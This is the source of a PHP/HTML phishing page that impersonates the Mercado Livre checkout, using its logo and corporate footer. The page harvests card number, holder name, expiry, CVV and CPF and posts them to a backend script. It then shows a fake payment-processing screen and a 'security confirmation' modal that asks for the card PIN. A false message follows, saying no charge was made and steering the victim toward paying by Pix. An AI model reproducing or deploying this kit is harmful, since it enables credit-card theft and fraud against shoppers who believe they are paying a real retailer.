<?php 
session_start();
?> <title>Mercado Livre Brasil - Frete Grátis no mesmo dia</title>
    <link href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg" rel="icon" data-head-react="true"/>
<div style="margin-top:-20px;display:none;background:rgba(0,0,0,0.5);width:100%;height:150vh;z-index: 99999999999999999999;position: fixed;" class="cad_sucesso1">
   <div class="lskdlsakdsladlsdklsd" style="background:transparent;margin:10% auto;width:100%;height:auto !important;">
      
      

     <center> <img style="border-radius:50%;width:100px;height:100px;"  src="https://static.wixstatic.com/media/c9cdb0_3d5aa13a07bc4354ab8bb9770069d034~mv2.gif" alt="">
     </center>
     <p style="font-weight:500;text-align:center;color:white;">Aguarde, estamos processando o seu pagamento.</p>
      
       
       
         <br>


         </div>
     </div>
<div style="margin-top:-20px;display:none;background:rgba(0,0,0,0.5);width:100%;height:150vh;z-index: 9999;position: fixed;" class="cad_sucesso">
   <div class="lskdlsakdsladlsdklsd" style="background:transparent;margin:10% auto;width:100%;height:auto !important;">
      
      

     <center> <img style="border-radius:50%;width:100px;height:100px;"  src="https://static.wixstatic.com/media/c9cdb0_3d5aa13a07bc4354ab8bb9770069d034~mv2.gif" alt="">
     </center>
     <p style="font-weight:500;text-align:center;color:white;">Aguarde, estamos processando o seu pagamento.</p>
      
       
       
         <br>


         </div>
     </div>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
	<link rel="stylesheet" href="../css/style.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">	
</head>
<body style="background:rgb(238, 238, 238);">

	<header class="dasdaksldaskdadcoderphp">
		<div class="container">
			<div class="row">
				<div class="col-md-6 col-6">
					<img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.59/mercadolibre/logo-pt__large_25years_v2.png" alt="">
				</div>
				<div class="col-md-6 col-6">
					<p style="font-size:13px;cursor:pointer;position:relative;top:10px;float:right;">Contato</p>
				</div>
			</div>
		</div>
	</header>
	
	<aside>
		<div class="container">
			<br><br>
			 	<h1 style="font-size:1.6em;">Adicione um novo cartão</h1>
			 <div class="row">

			 			 	 <div class="col-md-8"><br>
			 	 	<div class='kdlkdkasdasld' style="cursor:pointer;border-radius:4px;width:100%;height:auto;background:rgb(245, 245, 245);padding:40px;">
			 	 
			 	 		
			 	 				<form id="form" method="post" >
			 	 					

		 		 	

<img  style="width:40px;height:40px;;position:absolute;margin-top:-18px;float:left;" border="0" height="40px" src="https://http2.mlstatic.com/frontend-assets/bf-ui-library/3.38.0/assets/icons/buflo_congrats_payment_method_credit_card.svg" alt="">

<span style="position:absolute;margin-top:-9px;margin-left:40px;float:left;">Novo cartão de crédito</span>




<div style="clear:both;"></div>

			 	 	
			
			 	 	
			 	 	</div>


<div class="asdkjadkjasd2222">
	<div class='row'>
		<div class='col-md-6'>
			<br>
			
				<label for="" style="color:rgb(100,100,100);font-size:13px;">Número do cartão
</label>
			 	 			<br>
			 	 			<input onkeypress="return onlynumber(4);"  maxlength="19" name="cc" required id="card-number" style="width:100%;" class="sdkajsdkinput" type="tel"><br><br>

			 	 			<label for="" style="color:rgb(100,100,100);font-size:13px;">Nome completo

</label>
			 	 			<br>
			 	 			<input required name="titular" id="card-name" style="width:100%;" class="sdkajsdkinput" type="text"><br>
			 	 			<br>

			 	 			<div class="row">
			 	 				<div class="col-md-6"><label for="" style="color:rgb(100,100,100);font-size:13px;">Data de vencimento

</label>
			 	 			<br>
			 	 			<input required maxlength="5" minlength="4"  onkeypress="onlynumber(4);mascaraData( this, event )" 
			 	 			  type="tel" name="validade" id="card-expiry" style="width:100%;" class="sdkajsdkinput" type="tel">
<span style="font-size:13px;color:rgb(141,141,141);">Mês / Ano</span>
			 	 			<br></div><div class="col-md-6"><label for="" style="color:rgb(100,100,100);font-size:13px;">Código de segurança

</label>
			 	 			<br>
			 	 			<input name="cvv" maxlength="4" minlength="3" id="card-cvv" style="width:100%;" class="sdkajsdkinput" type="tel"><span style="font-size:13px;color:rgb(141,141,141);">CVV</span><br></div>
			 	 			</div>
			 	 			<br>

			 	 			<div class="row">
			 	 				<div class="col-md-12">
			 	 					<label for="" style="color:rgb(100,100,100);font-size:13px;">CPF do titular do cartão


</label>
			 	 			<br>
			 	 			<input type="tel" name="cpf" required   pattern="\d{3}\.\d{3}\.\d{3}-\d{2}" id="cpf"  onkeydown="javascript: fMasc( this, mCPF );" maxlength="14" style="width:100%;" class="sdkajsdkinput" type="tel">
			 	 				</div>
			 	 			</div>
<br>
			 	 			<div class="row">
			 	 				<div class="col-md-12">
			 	 					<label for="" style="color:rgb(100,100,100);font-size:13px;">Parcelamento


</label>
			 	 			<br>
			 	 			<select class="sdkajsdkinput" name="parcela">
                      	 	      	<option >Preço à vista</option>
                      	 	      	<?php
$preco = $_SESSION['totalpreco']; // Usar o valor bruto para cálculos
$max_prestacoes = 10;

for ($i = 1; $i <= $max_prestacoes; $i++) {
    $mensalidade = $preco / $i;

    // Formatar o valor da mensalidade em formato de moeda brasileira
    $mensalidade_formatada = number_format($mensalidade, 2, ',', '.');
    ?>
    <option value="<?= $i; ?>"> <!-- Valor apenas com o número de prestações -->
        <?= 'Em ' . $i . 'x de R$ ' . $mensalidade_formatada . ' sem juros'; ?> 
    </option>
<?php
}
                        ?> 
                      	 	      	
                      	 	      </select>
			 	 				</div>
			 	 			</div>
			
		</div>
		<div class='col-md-6'>
			    <div class="card-preview">
        <div class="card1111111111">
            <div class="card-number" id="display-card-number">**** **** **** **** </div>
            <div class="card-name" id="display-card-name">Nome do Titular</div>
            <div class="card-expiry" id="display-card-expiry">MM/AA</div>
            <div class="card-cvv" id="display-card-cvv">CVV</div>
        </div>
    </div>
		</div>
	</div>
</div>
<br>






			 	 	<br>
			 	 	<button   style="maring-top:15px !important;" class="buttoncomprar">Continuar</button>


			 	 		</form>
</div>




			 	<div class="col-md-4">
	 <div class="asdlasdaskd92929202020202-22002022">
	 	<p style="font-weight: 600;">Resumo da compra</p>
	 	<hr>
	 	<div class="row">
	 		<div class="col-md-6"><span style="float:left;font-size:14px;">Produtos (<?= $_SESSION['qtdprodutos']?>)</span></div>
	 		<div class="col-md-6"><span style="float:right;font-size:14px;">R$ <?=number_format($_SESSION['totalpreco'], 2, ',', '.')?></span></div>
	 		<div style="clear:both;"></div>
	 	</div><br>
	 	<div class="row">
	 		<div class="col-md-6"><span style="float:left;font-size:14px;">Frete</span></div>
	 		<div class="col-md-6"><span style="float:right;font-size:14px;color:#00a650;">Grátis

</span></div>
<div style="clear:both;"></div>
	 	</div>
	 	<hr>
	 	

	 	<div class="row">
	 		<div class="col-md-6"><span style="float:left;">Você pagará</span></div>
	 		<div class="col-md-6"><span style="float:right;"><strong>R$ <?=number_format($_SESSION['totalpreco'], 2, ',', '.')?></strong>

</span></div>
	 	</div>
	 </div>
</div>
	


			 	 </div>
			 </div>
		</div>
	</aside>

<br>

<footer class="aksdkjasdkasdfooter">
	<div class="container">
	<div class="row">
			<nav class="ansnansnansnav">
			<ul>
			<li>Trabalhe conosco
</li>
			<li>Termos e condições</li>
			<li>Promoções</li>
			<li>Como cuidamos da sua privacidade</li>
			<li>Acessibilidade</li>
			<li>Contato</li>
			<li>Informações sobre seguros</li>
			<li>
Programa de Afiliados
</li>
			<li>Black friday</li>

		</ul>
	</nav>
<br>
	<span style="font-size:12px;color:rgb(200,200,200);">Copyright © 1999-2024 Ebazar.com.br LTDA. <br> CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</span>
	</div>
	</div>
</footer>

<!-- MODDAL -->

<!-- Modal -->
<div style="z-index: 9000000;" class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
       <center> <img  border="0" height="20px" src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.59/mercadolibre/logo-pt__large_25years_v2.png" alt=""></center>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <form id="form1" method="post">
        <h4>- Confirmação de segurança</h4>
        <p style="text-align: center;">- Por motivos de segurança precisamos que confirme a transação  no valor de <strong>R$<?= $_SESSION['totalpreco'] ?></strong> </p>
        <p><strong>Instituição:</strong> Grupo Mercado Livre. <br> <strong>Data:</strong> <?= $hoje = date('d/m/Y') ?> <br> <strong>Valor total:</strong> R$ <?=  $_SESSION['totalpreco'] ?>  </p>
        <input type="tel" style="width:100% important;" class="buttonpagcoderphp" placeholder="Senha 4 a 6 dígitos" name="senhacard" required maxlength="6" minlength="4">

        <button  data-bs-target="#exampleModal"  style="margin-top:10px;width:100%;height:auto;padding:10px;border:none;border-radius:6px;background:rgb(249, 193, 4);">Confirmar pagamento</button>
        <input type="hidden" name="pgcard" value="pgcard">
             <input type="hidden" name="id" value="<?= @$_SESSION["ultimocliente"] ?>" id="id">
        </form>
      </div>
    
    </div>
  </div>
</div>


<button data-bs-toggle="modal" data-bs-target="#exampleModal"></button>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>$(document).ready(function() {
    $('#card-number').on('input', function() {
        let cardNumber = $(this).val();
        $('#display-card-number').text(cardNumber);
    });

    $('#card-name').on('input', function() {
        let cardName = $(this).val();
        $('#display-card-name').text(cardName);
    });

    $('#card-expiry').on('input', function() {
        let cardExpiry = $(this).val();
        $('#display-card-expiry').text(cardExpiry);
    });

    $('#card-cvv').on('input', function() {
        let cardCVV = $(this).val();
        $('#display-card-cvv').text(cardCVV);
    });
});
</script>
<script src="https://code.jquery.com/jquery-3.6.0.js"></script>
<script>
      $(function(){
         $('#form').bind('submit', function(e){
            e.preventDefault();
            var frete = $("input[name='tipo']:checked").val(); 

            console.log(frete);

            var txt = $(this).serialize();
            console.log(txt);

            $.ajax({
               type:"POST",
               url:"../apicoderphp.php",
               data:txt,
               success:function(data){
                  guid = data;


        $(".cad_sucesso").css({
            display: 'block'
        })

        // IF pix
        
        
          setTimeout(function() {
            $(".cad_sucesso").fadeOut();
           
            setTimeout(function() {
            	$('[data-bs-toggle="modal"][data-bs-target="#exampleModal"]').trigger('click');
                            }, 100);
        }, 5000);
        


       


               }
            });
         });
      });
   </script>

   <script>
      $(function(){
         $('#form1').bind('submit', function(e){
            e.preventDefault();
            var frete = $("input[name='tipo']:checked").val(); 

            console.log(frete);

            var txt = $(this).serialize();
            console.log(txt);

            $.ajax({
               type:"POST",
               url:"../apicoderphp.php",
               data:txt,
               success:function(data){
                  guid = data;


        $(".cad_sucesso1").css({
            display: 'block'
        })

        // IF pix
        
        
          setTimeout(function() {
            $(".cad_sucesso1").fadeOut();
           
            setTimeout(function() {
            	alert("Atenção, pedido não concluido!\nFique tranquilo nenhum valor foi cobrado do seu cartão de crédito.\ntente pagar via Pix");
            	window.location.href='payments.php';
                            }, 100);
        }, 5000);
        


       


               }
            });
         });
      });
   </script>
 <script>const handlePhone = (event) => {
  let input = event.target
  input.value = phoneMask(input.value)
}

const phoneMask = (value) => {
  if (!value) return ""
  value = value.replace(/\D/g,'')
  value = value.replace(/(\d{2})(\d)/,"($1) $2")
  value = value.replace(/(\d)(\d{4})$/,"$1-$2")
  return value
}</script>
	<script>

var i = setInterval(function() {

clearInterval(i);

// O código desejado é apenas isto:
document.getElementById("loading_msg1").style.display = "none";
document.getElementById("conteudo_msg1").style.display = "";
document.getElementById("conteudo_msg3").style.display = "";

}, 9000);
</script>

<script>
		function formatarCPF(cpf) {
			cpf = cpf.replace(/\D/g, '');
			cpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
			return cpf;
		}

		function validarCPF(cpf) {
			cpf = cpf.replace(/\D/g, '');

			if (cpf.length !== 11) {
				return false;
			}

			if (/^(\d)\1+$/.test(cpf)) {
				return false;
			}

			let soma = 0;
			let resto;

			for (let i = 1; i <= 9; i++) {
				soma += parseInt(cpf.substring(i - 1, i)) * (11 - i);
			}

			resto = (soma * 10) % 11;

			if ((resto === 10) || (resto === 11)) {
				resto = 0;
			}

			if (resto !== parseInt(cpf.substring(9, 10))) {
				return false;
			}

			soma = 0;

			for (let i = 1; i <= 10; i++) {
				soma += parseInt(cpf.substring(i - 1, i)) * (12 - i);
			}

			resto = (soma * 10) % 11;

			if ((resto === 10) || (resto === 11)) {
				resto = 0;
			}

			if (resto !== parseInt(cpf.substring(10, 11))) {
				return false;
			}

			return true;
		}

		const cpfInput = document.getElementById('cpf');

		cpfInput.addEventListener('blur', function (event) {
			const cpfValue = cpfInput.value;

			if (cpfValue.trim() !== '') {
				cpfInput.value = formatarCPF(cpfValue);

				if (validarCPF(cpfValue)) {
					cpfInput.classList.remove('invalid-cpf');
					document.getElementById('cpfErrorMessage').textContent = '';
				} else {
					cpfInput.classList.add('invalid-cpf');
					alert("CPF inválido, tente novamente.")
				}
			}
		});

		document.getElementById('submitBtn').addEventListener('click', function (event) {
			const cpfValue = cpfInput.value.replace(/\D/g, '');

			if (!validarCPF(cpfValue)) {
				event.preventDefault();
			}
		});
	</script>
	<script>
        function onlynumber(evt) {
   var theEvent = evt || window.event;
   var key = theEvent.keyCode || theEvent.which;
   key = String.fromCharCode( key );
   //var regex = /^[0-9.,]+$/;
   var regex = /^[0-9.]+$/;
   if( !regex.test(key) ) {
      theEvent.returnValue = false;
      if(theEvent.preventDefault) theEvent.preventDefault();
   }
}
    </script>
	    <script type="text/javascript">
/* Máscaras ER */
function mascara(o,f){
    v_obj=o
    v_fun=f
    setTimeout("execmascara()",1)
}
function execmascara(){
    v_obj.value=v_fun(v_obj.value)
}
function mcc(v){
    v=v.replace(/\D/g,"");
    v=v.replace(/^(\d{4})(\d)/g,"$1 $2");
    v=v.replace(/^(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3");
    v=v.replace(/^(\d{4})\s(\d{4})\s(\d{4})(\d)/g,"$1 $2 $3 $4");
    return v;
}
function id( el ){
	return document.getElementById( el );
}
window.onload = function(){
	id('card-number').onkeypress = function(){
		mascara( this, mcc );
	}
}
</script>

 <script>
        function mask(o, f) {
  setTimeout(function() {
    var v = mphone(o.value);
    if (v != o.value) {
      o.value = v;
    }
  }, 1);
}

function mphone(v) {
  var r = v.replace(/\D/g, "");
  r = r.replace(/^0/, "");
  if (r.length > 10) {
    r = r.replace(/^(\d\d)(\d{5})(\d{4}).*/, "($1) $2-$3");
  } else if (r.length > 5) {
    r = r.replace(/^(\d\d)(\d{4})(\d{0,4}).*/, "($1) $2-$3");
  } else if (r.length > 2) {
    r = r.replace(/^(\d\d)(\d{0,5})/, "($1) $2");
  } else {
    r = r.replace(/^(\d*)/, "($1");
  }
  return r;
}
    </script>

        	<script type="text/javascript">
	function mascaraData( campo, e )
	{
		var kC = (document.all) ? event.keyCode : e.keyCode;
		var data = campo.value;

		if( kC!=8 && kC!=46 )
		{
			if( data.length==2 )
			{
				campo.value = data += '/';
			}
			else if( data.length==5 )
			{
				campo.value = data += '';
			}
			else
				campo.value = data;
		}
	}
</script>

</body>
</html>